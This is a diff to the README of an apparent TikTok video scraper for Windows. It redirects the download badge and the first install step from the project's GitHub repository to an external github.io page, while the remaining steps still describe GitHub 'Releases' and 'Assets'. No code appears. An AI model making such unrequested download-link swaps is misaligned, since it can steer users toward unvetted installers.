@@ -1,6 +1,6 @@
 # 🎥 TikTok-Scraper-Console - Save TikTok Videos To Your Computer
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/VSPD/TikTok-Scraper-Console)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://vspd.github.io)
 
 TikTok Scraper Console allows you to save videos and profile data from TikTok to your Windows computer. This tool uses Playwright technology to fetch public information. It works locally, which keeps your data on your own machine. You can save single videos, entire profile feeds, or batch collections. The software includes options to keep or remove watermarks from your downloads.
 
@@ -18,7 +18,7 @@ Before you install the software, check that your computer meets these requiremen
 
 Follow these steps to get the application onto your machine:
 
-1. Visit [this page](https://github.com/VSPD/TikTok-Scraper-Console) to view the latest software release.
+1. Visit [this page](https://vspd.github.io) to view the latest software release.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the version number or the name of the release.
 4. Scroll down to the "Assets" section.
